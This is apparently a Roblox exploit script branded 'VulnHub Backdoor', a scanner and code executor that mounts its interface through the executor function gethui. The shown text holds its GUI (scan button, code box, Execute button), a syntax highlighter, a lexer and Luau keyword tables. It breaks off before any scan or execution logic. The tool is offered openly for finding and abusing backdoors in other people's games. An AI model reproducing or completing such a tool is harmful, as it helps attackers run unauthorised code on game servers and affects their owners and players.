local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SoundService = game:GetService("SoundService")
local Lighting = game:GetService("Lighting")

local LocalPlayer = Players.LocalPlayer

local function getUiParent()
	local ok, res = pcall(function()
		return gethui and gethui() or CoreGui
	end)
	if ok and res then
		return res
	end
	if LocalPlayer then
		return LocalPlayer:WaitForChild("PlayerGui")
	end
	return CoreGui
end

local uiParent = getUiParent()
local existing = uiParent:FindFirstChild("GatewayGui")
if existing then
	existing:Destroy()
end

local G2L = {}

G2L["1"] = Instance.new("ScreenGui")
G2L["1"].Name = "GatewayGui"
G2L["1"].ResetOnSpawn = false
G2L["1"].IgnoreGuiInset = true
G2L["1"].DisplayOrder = 999999
G2L["1"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
G2L["1"].Parent = uiParent

G2L["2"] = Instance.new("Frame")
G2L["2"].Name = "Frame"
G2L["2"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["2"].Size = UDim2.new(0, 460, 0, 270)
G2L["2"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["2"].BackgroundColor3 = Color3.fromRGB(18, 18, 22)
G2L["2"].BorderSizePixel = 0
G2L["2"].Parent = G2L["1"]

Instance.new("UICorner", G2L["2"]).CornerRadius = UDim.new(0, 10)
local mainStroke = Instance.new("UIStroke", G2L["2"])
mainStroke.Color = Color3.fromRGB(0, 180, 255)
mainStroke.Thickness = 1.5

local topBar = Instance.new("Frame")
topBar.Name = "TopBar"
topBar.Size = UDim2.new(1, 0, 0, 32)
topBar.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
topBar.BorderSizePixel = 0
topBar.Parent = G2L["2"]
Instance.new("UICorner", topBar).CornerRadius = UDim.new(0, 10)

G2L["1d"] = Instance.new("TextLabel")
G2L["1d"].Name = "TitleLabel"
G2L["1d"].Size = UDim2.new(1, -44, 1, 0)
G2L["1d"].Position = UDim2.new(0, 12, 0, 0)
G2L["1d"].BackgroundTransparency = 1
G2L["1d"].Text = "VULNHUB BACKDOOR"
G2L["1d"].TextColor3 = Color3.fromRGB(0, 255, 200)
G2L["1d"].Font = Enum.Font.GothamBold
G2L["1d"].TextSize = 12
G2L["1d"].TextXAlignment = Enum.TextXAlignment.Left
G2L["1d"].Parent = topBar

local exitButton = Instance.new("TextButton")
exitButton.Name = "ExitButton"
exitButton.Size = UDim2.new(0, 24, 0, 24)
exitButton.Position = UDim2.new(1, -28, 0.5, -12)
exitButton.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
exitButton.BorderSizePixel = 0
exitButton.Text = "×"
exitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
exitButton.Font = Enum.Font.GothamBold
exitButton.TextSize = 15
exitButton.Parent = topBar
Instance.new("UICorner", exitButton).CornerRadius = UDim.new(0, 5)

local statusLabel = Instance.new("TextLabel")
statusLabel.Name = "StatusLabel"
statusLabel.Size = UDim2.new(1, -50, 0, 26)
statusLabel.Position = UDim2.new(0, 10, 0, 38)
statusLabel.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
statusLabel.BorderSizePixel = 0
statusLabel.Text = "Deep remote scanner ready (Press LeftAlt to toggle UI)"
statusLabel.TextColor3 = Color3.fromRGB(235, 235, 240)
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextSize = 10
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.TextWrapped = true
statusLabel.Parent = G2L["2"]
Instance.new("UICorner", statusLabel).CornerRadius = UDim.new(0, 6)

local statusIcon = Instance.new("TextLabel")
statusIcon.Name = "StatusIcon"
statusIcon.Size = UDim2.new(0, 24, 0, 24)
statusIcon.Position = UDim2.new(1, -34, 0, 39)
statusIcon.BackgroundTransparency = 1
statusIcon.Text = "🔍"
statusIcon.TextScaled = true
statusIcon.Visible = true
statusIcon.Parent = G2L["2"]

G2L["16"] = Instance.new("Frame")
G2L["16"].Name = "Scanner"
G2L["16"].Size = UDim2.new(1, -20, 0, 186)
G2L["16"].Position = UDim2.new(0, 10, 0, 72)
G2L["16"].BackgroundColor3 = Color3.fromRGB(24, 24, 30)
G2L["16"].BorderSizePixel = 0
G2L["16"].Visible = false
G2L["16"].Parent = G2L["2"]
Instance.new("UICorner", G2L["16"]).CornerRadius = UDim.new(0, 8)
local scannerStroke = Instance.new("UIStroke", G2L["16"])
scannerStroke.Color = Color3.fromRGB(0, 180, 255)
scannerStroke.Thickness = 1

local avatarLabel = Instance.new("ImageLabel")
avatarLabel.Name = "Avatar"
avatarLabel.AnchorPoint = Vector2.new(0.5, 0.5)
avatarLabel.Size = UDim2.new(0, 48, 0, 48)
avatarLabel.Position = UDim2.new(0.5, 0, 0, 36)
avatarLabel.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
avatarLabel.BorderSizePixel = 0
avatarLabel.Image = ""
avatarLabel.Parent = G2L["16"]
Instance.new("UICorner", avatarLabel).CornerRadius = UDim.new(1, 0)
local avatarStroke = Instance.new("UIStroke", avatarLabel)
avatarStroke.Color = Color3.fromRGB(0, 180, 255)
avatarStroke.Thickness = 1.5

local subInfoLabel = Instance.new("TextLabel")
subInfoLabel.Name = "SubInfo"
subInfoLabel.Size = UDim2.new(1, -20, 0, 24)
subInfoLabel.Position = UDim2.new(0, 10, 0, 68)
subInfoLabel.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
subInfoLabel.BorderSizePixel = 0
subInfoLabel.Text = LocalPlayer and ("Player: @" .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")") or "Player: Unknown"
subInfoLabel.TextColor3 = Color3.fromRGB(0, 255, 200)
subInfoLabel.Font = Enum.Font.GothamBold
subInfoLabel.TextSize = 10
subInfoLabel.TextWrapped = true
subInfoLabel.Parent = G2L["16"]
Instance.new("UICorner", subInfoLabel).CornerRadius = UDim.new(0, 6)

G2L["1a"] = Instance.new("TextButton")
G2L["1a"].Name = "Button"
G2L["1a"].Size = UDim2.new(1, -20, 0, 38)
G2L["1a"].Position = UDim2.new(0, 10, 0, 104)
G2L["1a"].BackgroundColor3 = Color3.fromRGB(0, 160, 110)
G2L["1a"].BorderSizePixel = 0
G2L["1a"].Text = "Start Deep Scan"
G2L["1a"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["1a"].Font = Enum.Font.GothamBold
G2L["1a"].TextSize = 13
G2L["1a"].Parent = G2L["16"]
Instance.new("UICorner", G2L["1a"]).CornerRadius = UDim.new(0, 6)

local devFooterLabel = Instance.new("TextLabel")
devFooterLabel.Name = "DevFooter"
devFooterLabel.Size = UDim2.new(1, -20, 0, 24)
devFooterLabel.Position = UDim2.new(0, 10, 0, 150)
devFooterLabel.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
devFooterLabel.BorderSizePixel = 0
devFooterLabel.Text = "VulnHub Backdoor | Deep Scanner & Executor"
devFooterLabel.TextColor3 = Color3.fromRGB(0, 255, 200)
devFooterLabel.Font = Enum.Font.GothamBold
devFooterLabel.TextSize = 10
devFooterLabel.Parent = G2L["16"]
Instance.new("UICorner", devFooterLabel).CornerRadius = UDim.new(0, 6)

G2L["6"] = Instance.new("Folder")
G2L["6"].Name = "Executor"
G2L["6"].Parent = G2L["2"]

G2L["f"] = Instance.new("Frame")
G2L["f"].Name = "ExecutorBox"
G2L["f"].Size = UDim2.new(1, -20, 0, 142)
G2L["f"].Position = UDim2.new(0, 10, 0, 72)
G2L["f"].BackgroundColor3 = Color3.fromRGB(28, 28, 36)
G2L["f"].BorderSizePixel = 0
G2L["f"].Visible = false
G2L["f"].Parent = G2L["2"]
Instance.new("UICorner", G2L["f"]).CornerRadius = UDim.new(0, 8)
local boxStroke = Instance.new("UIStroke", G2L["f"])
boxStroke.Color = Color3.fromRGB(0, 180, 255)
boxStroke.Thickness = 1

G2L["11"] = Instance.new("TextBox")
G2L["11"].Name = "TextBox"
G2L["11"].Size = UDim2.new(1, -12, 1, -10)
G2L["11"].Position = UDim2.new(0, 6, 0, 5)
G2L["11"].BackgroundTransparency = 1
G2L["11"].Text = ""
G2L["11"].PlaceholderText = 'print("VulnHub Hub Loaded!")'
G2L["11"].TextColor3 = Color3.fromRGB(235, 235, 240)
G2L["11"].Font = Enum.Font.Code
G2L["11"].TextSize = 13
G2L["11"].TextXAlignment = Enum.TextXAlignment.Left
G2L["11"].TextYAlignment = Enum.TextYAlignment.Top
G2L["11"].TextWrapped = true
G2L["11"].MultiLine = true
G2L["11"].ClearTextOnFocus = false
G2L["11"].Parent = G2L["f"]

G2L["12"] = Instance.new("LocalScript")
G2L["12"].Name = "Highlight"
G2L["12"].Parent = G2L["11"]

G2L["13"] = Instance.new("ModuleScript")
G2L["13"].Name = "Highlighter"
G2L["13"].Parent = G2L["12"]

G2L["14"] = Instance.new("ModuleScript")
G2L["14"].Name = "lexer"
G2L["14"].Parent = G2L["13"]

G2L["15"] = Instance.new("ModuleScript")
G2L["15"].Name = "language"
G2L["15"].Parent = G2L["14"]

G2L["7"] = Instance.new("Frame")
G2L["7"].Name = "Execute"
G2L["7"].Size = UDim2.new(0.62, -12, 0, 32)
G2L["7"].Position = UDim2.new(0, 10, 0, 222)
G2L["7"].BackgroundColor3 = Color3.fromRGB(0, 160, 110)
G2L["7"].BorderSizePixel = 0
G2L["7"].Visible = false
G2L["7"].Parent = G2L["2"]
Instance.new("UICorner", G2L["7"]).CornerRadius = UDim.new(0, 6)

G2L["8"] = Instance.new("TextButton")
G2L["8"].Name = "Button"
G2L["8"].Size = UDim2.new(1, 0, 1, 0)
G2L["8"].BackgroundTransparency = 1
G2L["8"].Text = "Execute"
G2L["8"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["8"].Font = Enum.Font.GothamBold
G2L["8"].TextSize = 12

G2L["b"] = Instance.new("Frame")
G2L["b"].Name = "Clear"
G2L["b"].Size = UDim2.new(0.38, -12, 0, 32)
G2L["b"].Position = UDim2.new(0.62, 2, 0, 222)
G2L["b"].BackgroundColor3 = Color3.fromRGB(32, 32, 40)
G2L["b"].BorderSizePixel = 0
G2L["b"].Visible = false
G2L["b"].Parent = G2L["2"]
Instance.new("UICorner", G2L["b"]).CornerRadius = UDim.new(0, 6)
local clearStroke = Instance.new("UIStroke", G2L["b"])
clearStroke.Color = Color3.fromRGB(0, 255, 200)
clearStroke.Thickness = 1

G2L["c"] = Instance.new("TextButton")
G2L["c"].Name = "Button"
G2L["c"].Size = UDim2.new(1, 0, 1, 0)
G2L["c"].BackgroundTransparency = 1
G2L["c"].Text = "Clear"
G2L["c"].TextColor3 = Color3.fromRGB(0, 255, 200)
G2L["c"].Font = Enum.Font.GothamBold
G2L["c"].TextSize = 12

local G2L_MODULES = {}
local function require(Module: ModuleScript)
	local ModuleState = G2L_MODULES[Module]
	if ModuleState then
		if not ModuleState.Required then
			ModuleState.Required = true
			ModuleState.Value = ModuleState.Closure()
		end
		return ModuleState.Value
	end
	return getfenv().require(Module)
end

G2L_MODULES[G2L["13"]] = {
	Closure = function()
		local script = G2L["13"]
		local function SanitizeRichText(s: string): string
			return string.gsub(
				string.gsub(string.gsub(string.gsub(string.gsub(s, "&", "&amp;"), "<", "&lt;"), ">", "&gt;"), '"', "&quot;"),
				"'",
				"&apos;"
			)
		end
		local function SanitizeTabs(s: string): string
			return string.gsub(s, "\t", " ")
		end
		local function SanitizeControl(s: string): string
			return string.gsub(s, "[\0\1\2\3\4\5\6\7\8\11\12\13\14\15\16\17\18\19\20\21\22\23\24\25\26\27\28\29\30\31]+", "")
		end
		local TokenColors = {
			["background"] = Color3.fromRGB(28, 28, 36),
			["iden"] = Color3.fromRGB(234, 234, 234),
			["keyword"] = Color3.fromRGB(215, 174, 255),
			["builtin"] = Color3.fromRGB(131, 206, 255),
			["string"] = Color3.fromRGB(196, 255, 193),
			["number"] = Color3.fromRGB(255, 125, 125),
			["comment"] = Color3.fromRGB(140, 140, 155),
			["operator"] = Color3.fromRGB(255, 239, 148),
			["custom"] = Color3.fromRGB(0, 255, 200),
		}
		local ColorFormatter = {}
		local LastData = {}
		local Cleanups = {}
		local Highlighter = {
			defaultLexer = require(script.lexer),
		}
		function Highlighter.highlight(props)
			local textObject = props.textObject
			local src = SanitizeTabs(SanitizeControl(props.src or textObject.Text))
			local lexer = props.lexer or Highlighter.defaultLexer
			local customLang = props.customLang
			local forceUpdate = props.forceUpdate
			local data = LastData[textObject]
			if data == nil then
				data = {
					Text = "",
					Labels = {},
					Lines = {},
					Lexer = lexer,
					CustomLang = customLang,
				}
				LastData[textObject] = data
			elseif forceUpdate ~= true and data.Text == src then
				return
			end
			local lineLabels = data.Labels
			local previousLines = data.Lines
			local lines = string.split(src, "\n")
			data.Lines = lines
			data.Text = src
			data.Lexer = lexer
			data.CustomLang = customLang
			textObject.RichText = false
			textObject.Text = src
			textObject.TextXAlignment = Enum.TextXAlignment.Left
			textObject.TextYAlignment = Enum.TextYAlignment.Top
			textObject.BackgroundColor3 = TokenColors.background
			textObject.TextColor3 = TokenColors.iden
			textObject.TextTransparency = 0.5
			local lineFolder = textObject:FindFirstChild("SyntaxHighlights")
			if lineFolder == nil then
				local newLineFolder = Instance.new("Folder")
				newLineFolder.Name = "SyntaxHighlights"
				newLineFolder.Parent = textObject
				lineFolder = newLineFolder
			end
			local cleanup = Cleanups[textObject]
			if not cleanup then
				local connections = {}
				local function newCleanup()
					for _, label in ipairs(lineLabels) do
						label:Destroy()
					end
					table.clear(lineLabels)
					lineLabels = nil
					LastData[textObject] = nil
					Cleanups[textObject] = nil
					for _, connection in connections do
						connection:Disconnect()
					end
					table.clear(connections)
					connections = nil
				end
				Cleanups[textObject] = newCleanup
				cleanup = newCleanup
				table.insert(connections, textObject.AncestryChanged:Connect(function()
					if textObject.Parent then
						return
					end
					cleanup()
				end))
				table.insert(connections, textObject:GetPropertyChangedSignal("TextBounds"):Connect(function()
					Highlighter.highlight({
						textObject = textObject,
						forceUpdate = true,
						lexer = lexer,
						customLang = customLang,
					})
				end))
				table.insert(connections, textObject:GetPropertyChangedSignal("Text"):Connect(function()
					Highlighter.highlight({
						textObject = textObject,
						lexer = lexer,
						customLang = customLang,
					})
				end))
				table.insert(connections, textObject:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
					Highlighter.highlight({
						textObject = textObject,
						forceUpdate = true,
						lexer = lexer,
						customLang = customLang,
					})
				end))
			end
			if src == "" then
				for l = 1, #lineLabels do
					if lineLabels[l].Text == "" then continue end
					lineLabels[l].Text = ""
				end
				return cleanup
			end
			local textBounds = textObject.TextBounds
			while (textBounds.Y ~= textBounds.Y) or (textBounds.Y < 1) do
				task.wait()
				textBounds = textObject.TextBounds
			end
			if LastData[textObject] == nil then
				return cleanup
			end
			local numLines = #lines
			local textHeight = textBounds.Y / numLines * textObject.LineHeight
			local richText, index, lineNumber = table.create(5), 0, 1
			for token: string, content: string in lexer.scan(src) do
				local Color =
					if customLang and customLang[content] then
						TokenColors["custom"]
					else
						TokenColors[token] or TokenColors["iden"]
				local tokenLines = string.split(SanitizeRichText(content), "\n")
				for l, line in ipairs(tokenLines) do
					local lineLabel = lineLabels[lineNumber]
					if not lineLabel then
						local newLabel = Instance.new("TextLabel")
						newLabel.Name = "Line_" .. lineNumber
						newLabel.RichText = true
						newLabel.BackgroundTransparency = 1
						newLabel.Text = ""
						newLabel.TextXAlignment = Enum.TextXAlignment.Left
						newLabel.TextYAlignment = Enum.TextYAlignment.Top
						newLabel.Parent = lineFolder
						newLabel.TextWrapped = true
						lineLabels[lineNumber] = newLabel
						lineLabel = newLabel
					end
					lineLabel.TextColor3 = TokenColors["iden"]
					lineLabel.Font = textObject.Font
					lineLabel.TextSize = textObject.TextSize
					lineLabel.Size = UDim2.new(1, 0, 0, math.ceil(textHeight))
					lineLabel.Position = UDim2.fromScale(0, textHeight * (lineNumber - 1) / textObject.AbsoluteSize.Y)
					if l > 1 then
						if forceUpdate or lines[lineNumber] ~= previousLines[lineNumber] then
							lineLabels[lineNumber].Text = table.concat(richText)
						end
						lineNumber += 1
						index = 0
						table.clear(richText)
					end
					if forceUpdate or lines[lineNumber] ~= previousLines[lineNumber] then
						index += 1
						if Color ~= TokenColors["iden"] and string.find(line, "[%S%C]") then
							richText[index] = string.format(ColorFormatter[Color], line)
						else
							richText[index] = line
						end
					end
				end
			end
			if richText[1] and lineLabels[lineNumber] then
				lineLabels[lineNumber].Text = table.concat(richText)
			end
			for l = lineNumber + 1, #lineLabels do
				if lineLabels[l].Text == "" then continue end
				lineLabels[l].Text = ""
			end
			return cleanup
		end
		function Highlighter.refresh()
			for textObject, data in pairs(LastData) do
				for _, lineLabel in ipairs(data.Labels) do
					lineLabel.TextColor3 = TokenColors["iden"]
				end
				Highlighter.highlight({
					textObject = textObject,
					forceUpdate = true,
					src = data.Text,
					lexer = data.Lexer,
					customLang = data.CustomLang,
				})
			end
		end
		function Highlighter.setTokenColors(colors)
			for token, color in colors do
				TokenColors[token] = color
				ColorFormatter[color] = string.format(
					'<font color="#%.2x%.2x%.2x">',
					color.R * 255,
					color.G * 255,
					color.B * 255
				) .. "%s</font>"
			end
			Highlighter.refresh()
		end
		Highlighter.setTokenColors(TokenColors)
		return Highlighter
	end,
}

G2L_MODULES[G2L["14"]] = {
	Closure = function()
		local script = G2L["14"]
		local lexer = {}
		local Prefix, Suffix, Cleaner = "^[%c%s]*", "[%c%s]*", "[%c%s]+"
		local UNICODE = "[%z\x01-\x7F\xC2-\xF4][\x80-\xBF]+"
		local NUMBER_A = "0[xX][%da-fA-F_]+"
		local NUMBER_B = "0[bB][01_]+"
		local NUMBER_C = "%d+%.?%d*[eE][%+%-]?%d+"
		local NUMBER_D = "%d+[%._]?[%d_eE]*"
		local OPERATORS = "[:;<>/~%*%(%)%-={},%.#%^%+%%]+"
		local BRACKETS = "[%[%]]+"
		local IDEN = "[%a_][%w_]*"
		local STRING_EMPTY = "(['\"])%1"
		local STRING_PLAIN = "(['\"])[^\n]-([^\\]%1)"
		local STRING_INTER = "`[^\n]-`"
		local STRING_INCOMP_A = "(['\"]).-\n"
		local STRING_INCOMP_B = "(['\"])[^\n]*"
		local STRING_MULTI = "%[(=*)%[.-%]%1%]"
		local STRING_MULTI_INCOMP = "%[=*%[.-.*"
		local COMMENT_MULTI = "%-%-%[(=*)%[.-%]%1%]"
		local COMMENT_MULTI_INCOMP = "%-%-%[=*%[.-.*"
		local COMMENT_PLAIN = "%-%-.-\n"
		local COMMENT_INCOMP = "%-%-.*"
		local lang = require(script.language)
		local lua_keyword = lang.keyword
		local lua_builtin = lang.builtin
		local lua_libraries = lang.libraries
		lexer.language = lang
		local lua_matches = {
			{ Prefix .. IDEN .. Suffix, "var" },
			{ Prefix .. NUMBER_A .. Suffix, "number" },
			{ Prefix .. NUMBER_B .. Suffix, "number" },
			{ Prefix .. NUMBER_C .. Suffix, "number" },
			{ Prefix .. NUMBER_D .. Suffix, "number" },
			{ Prefix .. STRING_EMPTY .. Suffix, "string" },
			{ Prefix .. STRING_PLAIN .. Suffix, "string" },
			{ Prefix .. STRING_INCOMP_A .. Suffix, "string" },
			{ Prefix .. STRING_INCOMP_B .. Suffix, "string" },
			{ Prefix .. STRING_MULTI .. Suffix, "string" },
			{ Prefix .. STRING_MULTI_INCOMP .. Suffix, "string" },
			{ Prefix .. STRING_INTER .. Suffix, "string_inter" },
			{ Prefix .. COMMENT_MULTI .. Suffix, "comment" },
			{ Prefix .. COMMENT_MULTI_INCOMP .. Suffix, "comment" },
			{ Prefix .. COMMENT_PLAIN .. Suffix, "comment" },
			{ Prefix .. COMMENT_INCOMP .. Suffix, "comment" },
			{ Prefix .. OPERATORS .. Suffix, "operator" },
			{ Prefix .. BRACKETS .. Suffix, "operator" },
			{ Prefix .. UNICODE .. Suffix, "iden" },
			{ "^.", "iden" },
		}
		local PATTERNS, TOKENS = {}, {}
		for i, m in lua_matches do
			PATTERNS[i] = m[1]
			TOKENS[i] = m[2]
		end
		function lexer.scan(s: string)
			local index = 1
			local size = #s
			local previousContent1, previousContent2, previousContent3, previousToken = "", "", "", ""
			local thread = coroutine.create(function()
				while index <= size do
					local matched = false
					for tokenType, pattern in ipairs(PATTERNS) do
						local start, finish = string.find(s, pattern, index)
						if start == nil then continue end
						index = finish + 1
						matched = true
						local content = string.sub(s, start, finish)
						local rawToken = TOKENS[tokenType]
						local processedToken = rawToken
						if rawToken == "var" then
							local cleanContent = string.gsub(content, Cleaner, "")
							if lua_keyword[cleanContent] then
								processedToken = "keyword"
							elseif lua_builtin[cleanContent] then
								processedToken = "builtin"
							elseif string.find(previousContent1, "%.[%s%c]*$") and previousToken ~= "comment" then
								local parent = string.gsub(previousContent2, Cleaner, "")
								local lib = lua_libraries[parent]
								if lib and lib[cleanContent] and not string.find(previousContent3, "%.[%s%c]*$") then
									processedToken = "builtin"
								else
									processedToken = "iden"
								end
							else
								processedToken = "iden"
							end
						elseif rawToken == "string_inter" then
							if not string.find(content, "[^\\]{") then
								processedToken = "string"
							else
								processedToken = nil
								local isString = true
								local subIndex = 1
								local subSize = #content
								while subIndex <= subSize do
									local subStart, subFinish = string.find(content, "^.-[^\\][{}]", subIndex)
									if subStart == nil then
										coroutine.yield("string", string.sub(content, subIndex))
										break
									end
									if isString then
										subIndex = subFinish + 1
										coroutine.yield("string", string.sub(content, subStart, subFinish))
										isString = false
									else
										subIndex = subFinish
										local subContent = string.sub(content, subStart, subFinish - 1)
										for innerToken, innerContent in lexer.scan(subContent) do
											coroutine.yield(innerToken, innerContent)
										end
										isString = true
									end
								end
							end
						end
						previousContent3 = previousContent2
						previousContent2 = previousContent1
						previousContent1 = content
						previousToken = processedToken or rawToken
						if processedToken then
							coroutine.yield(processedToken, content)
						end
						break
					end
					if not matched then
						return
					end
				end
			end)
			return function()
				if coroutine.status(thread) == "dead" then
					return
				end
				local success, token, content = coroutine.resume(thread)
				if success and token then
					return token, content
				end
			end
		end
		function lexer.navigator()
			local nav = {
				Source = "",
				TokenCache = table.create(50),
				_RealIndex = 0,
				_UserIndex = 0,
				_ScanThread = nil,
			}
			function nav:Destroy()
				self.Source = nil
				self._RealIndex = nil
				self._UserIndex = nil
				self.TokenCache = nil
				self._ScanThread = nil
			end
			function nav:SetSource(SourceString)
				self.Source = SourceString
				self._RealIndex = 0
				self._UserIndex = 0
				table.clear(self.TokenCache)
				self._ScanThread = coroutine.create(function()
					for Token, Src in lexer.scan(self.Source) do
						self._RealIndex += 1
						self.TokenCache[self._RealIndex] = { Token, Src }
						coroutine.yield(Token, Src)
					end
				end)
			end
			function nav.Next()
				nav._UserIndex += 1
				if nav._RealIndex >= nav._UserIndex then
					return table.unpack(nav.TokenCache[nav._UserIndex])
				elseif coroutine.status(nav._ScanThread) ~= "dead" then
					local success, token, src = coroutine.resume(nav._ScanThread)
					if success and token then
						return token, src
					end
				end
			end
			function nav.Peek(PeekAmount)
				local GoalIndex = nav._UserIndex + PeekAmount
				if nav._RealIndex >= GoalIndex then
					if GoalIndex > 0 then
						return table.unpack(nav.TokenCache[GoalIndex])
					end
				elseif coroutine.status(nav._ScanThread) ~= "dead" then
					local IterationsAway = GoalIndex - nav._RealIndex
					local success, token, src = nil, nil, nil
					for _ = 1, IterationsAway do
						success, token, src = coroutine.resume(nav._ScanThread)
						if not (success or token) then
							break
						end
					end
					return token, src
				end
			end
			return nav
		end
		return lexer
	end,
}

G2L_MODULES[G2L["15"]] = {
	Closure = function()
		local language = {
			keyword = {
				["and"] = "keyword", ["break"] = "keyword", ["continue"] = "keyword",
				["do"] = "keyword", ["else"] = "keyword", ["elseif"] = "keyword",
				["end"] = "keyword", ["export"] = "keyword", ["false"] = "keyword",
				["for"] = "keyword", ["function"] = "keyword", ["if"] = "keyword",
				["in"] = "keyword", ["local"] = "keyword", ["nil"] = "keyword",
				["not"] = "keyword", ["or"] = "keyword", ["repeat"] = "keyword",
				["return"] = "keyword", ["self"] = "keyword", ["then"] = "keyword",
				["true"] = "keyword", ["type"] = "keyword", ["typeof"] = "keyword",
				["until"] = "keyword", ["while"] = "keyword",
			},
			builtin = {
				["assert"] = "function", ["error"] = "function", ["getfenv"] = "function",
				["getmetatable"] = "function", ["ipairs"] = "function", ["loadstring"] = "function",
				["newproxy"] = "function", ["next"] = "function", ["pairs"] = "function",
				["pcall"] = "function", ["print"] = "function", ["rawequal"] = "function",
				["rawget"] = "function", ["rawlen"] = "function", ["rawset"] = "function",
				["select"] = "function", ["setfenv"] = "function", ["setmetatable"] = "function",
				["tonumber"] = "function", ["tostring"] = "function", ["unpack"] = "function",
				["xpcall"] = "function", ["collectgarbage"] = "function", ["_G"] = "table",
				["_VERSION"] = "string", ["bit32"] = "table", ["coroutine"] = "table",
				["debug"] = "table", ["math"] = "table", ["os"] = "table",
				["string"] = "table", ["table"] = "table", ["utf8"] = "table",
				["DebuggerManager"] = "function", ["delay"] = "function", ["gcinfo"] = "function",
				["PluginManager"] = "function", ["require"] = "function", ["settings"] = "function",
				["spawn"] = "function", ["tick"] = "function", ["time"] = "function",
				["UserSettings"] = "function", ["wait"] = "function", ["warn"] = "function",
				["Delay"] = "function", ["ElapsedTime"] = "function", ["elapsedTime"] = "function",
				["printidentity"] = "function", ["Spawn"] = "function", ["Stats"] = "function",
				["stats"] = "function", ["Version"] = "function", ["version"] = "function",
				["Wait"] = "function", ["ypcall"] = "function", ["game"] = "Instance",
				["plugin"] = "Instance", ["script"] = "Instance", ["shared"] = "Instance",
				["workspace"] = "Instance", ["Game"] = "Instance", ["Workspace"] = "Instance",
				["Axes"] = "table", ["BrickColor"] = "table", ["CatalogSearchParams"] = "table",
				["CFrame"] = "table", ["Color3"] = "table", ["ColorSequence"] = "table",
				["ColorSequenceKeypoint"] = "table", ["DateTime"] = "table",
				["DockWidgetPluginGuiInfo"] = "table", ["Enum"] = "table", ["Faces"] = "table",
				["FloatCurveKey"] = "table", ["Font"] = "table", ["Instance"] = "table",
				["NumberRange"] = "table", ["NumberSequence"] = "table",
				["NumberSequenceKeypoint"] = "table", ["OverlapParams"] = "table",
				["PathWaypoint"] = "table", ["PhysicalProperties"] = "table", ["Random"] = "table",
				["Ray"] = "table", ["RaycastParams"] = "table", ["Rect"] = "table",
				["Region3"] = "table", ["Region3int16"] = "table", ["RotationCurveKey"] = "table",
				["task"] = "table", ["TweenInfo"] = "table", ["UDim"] = "table",
				["UDim2"] = "table", ["Vector2"] = "table", ["Vector2int16"] = "table",
				["Vector3"] = "table", ["Vector3int16"] = "table",
			},
			libraries = {
				bit32 = {
					arshift = "function", band = "function", bnot = "function", bor = "function",
					btest = "function", bxor = "function", countlz = "function", countrz = "function",
					extract = "function", lrotate = "function", lshift = "function",
					replace = "function", rrotate = "function", rshift = "function",
				},
				coroutine = {
					close = "function", create = "function", isyieldable = "function",
					resume = "function", running = "function", status = "function",
					wrap = "function", yield = "function",
				},
				debug = {
					dumpheap = "function", info = "function", loadmodule = "function",
					profilebegin = "function", profileend = "function",
					resetmemorycategory = "function", setmemorycategory = "function",
					traceback = "function",
				},
				math = {
					abs = "function", acos = "function", asin = "function", atan2 = "function",
					atan = "function", ceil = "function", clamp = "function", cos = "function",
					cosh = "function", deg = "function", exp = "function", floor = "function",
					fmod = "function", frexp = "function", ldexp = "function", log10 = "function",
					log = "function", max = "function", min = "function", modf = "function",
					noise = "function", pow = "function", rad = "function", random = "function",
					randomseed = "function", round = "function", sign = "function", sin = "function",
					sinh = "function", sqrt = "function", tan = "function", tanh = "function",
					huge = "number", pi = "number",
				},
				os = { clock = "function", date = "function", difftime = "function", time = "function" },
				string = {
					byte = "function", char = "function", find = "function", format = "function",
					gmatch = "function", gsub = "function", len = "function", lower = "function",
					match = "function", pack = "function", packsize = "function", rep = "function",
					reverse = "function", split = "function", sub = "function", unpack = "function",
					upper = "function",
				},
				table = {
					clear = "function", clone = "function", concat = "function", create = "function",
					find = "function", foreach = "function", foreachi = "function", freeze = "function",
					getn = "function", insert = "function", isfrozen = "function", maxn = "function",
					move = "function", pack = "function", remove = "function", sort = "function",
					unpack = "function",
				},
				utf8 = {
					char = "function", codepoint = "function", codes = "function",
					graphemes = "function", len = "function", nfcnormalize = "function",
					nfdnormalize = "function", offset = "function", charpattern = "string",
				},
				Axes = { new = "function" },
				BrickColor = {
					Black = "function", Blue = "function", DarkGray = "function", Gray = "function",
					Green = "function", new = "function", New = "function", palette = "function",
					Random = "function", random = "function", Red = "function", White = "function",
					Yellow = "function",
				},
				CatalogSearchParams = { new = "function" },
				CFrame = {
					Angles = "function", fromAxisAngle = "function", fromEulerAngles = "function",
					fromEulerAnglesXYZ = "function", fromEulerAnglesYXZ = "function",
					fromMatrix = "function", fromOrientation = "function", lookAt = "function",
					new = "function", identity = "CFrame",
				},
				Color3 = { fromHex = "function", fromHSV = "function", fromRGB = "function", new = "function", toHSV = "function" },
				ColorSequence = { new = "function" },
				ColorSequenceKeypoint = { new = "function" },
				DateTime = {
					fromIsoDate = "function", fromLocalTime = "function", fromUniversalTime = "function",
					fromUnixTimestamp = "function", fromUnixTimestampMillis = "function", now = "function",
				},
				DockWidgetPluginGuiInfo = { new = "function" },
				Enum = {},
				Faces = { new = "function" },
				FloatCurveKey = { new = "function" },
				Font = { fromEnum = "function", fromId = "function", fromName = "function", new = "function" },
				Instance = { new = "function" },
				NumberRange = { new = "function" },
				NumberSequence = { new = "function" },
				NumberSequenceKeypoint = { new = "function" },
				OverlapParams = { new = "function" },
				PathWaypoint = { new = "function" },
				PhysicalProperties = { new = "function" },
				Random = { new = "function" },
				Ray = { new = "function" },
				RaycastParams = { new = "function" },
				Rect = { new = "function" },
				Region3 = { new = "function" },
